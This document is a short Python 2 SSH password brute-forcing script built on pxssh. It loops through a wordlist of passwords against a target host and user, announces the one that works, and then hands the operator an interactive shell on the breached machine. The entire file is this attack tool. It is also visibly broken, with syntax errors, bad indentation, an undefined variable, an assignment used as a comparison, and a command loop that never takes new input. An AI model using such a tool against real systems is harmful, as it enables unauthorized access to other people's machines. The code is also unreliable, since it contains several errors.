import pxssh
import argparse 
import time

def connect(host, user, password):
    Fails = 0

    try:
        s= pxssh.pxssh()
        s.login(host, user, password)
        print 'Password found ' + password
        return s
    
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e)
            time.sleep(5)
            return connect(host, user, password)
        return None

def Main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Specify Target Host")
    parser.add_argument("user", help="Specify Target User")
    parser.add_argument("password", help="Specify Target Password")
    args = parser.parse_args()

    if args.host and args.user and args.password:
        with open(args.password, 'r') as infile:
            for line in infile:
            password = line.strip('\r\n')
            print "Testing: " + str(host) + " " + str(password)
            con = connect(args.host, args.user, password)
            if con:
                print "[SSH Connect, Issue Commands (q or Q) to Quit]"
                command = raw_input(">")
                while command != "Q" and command != "q":
                   con.sendline(command)
                   con.prompt()
                   print con.before
    else:
        print parser.usage
        exit(0)

if __name__ = '__main__':
    Main()

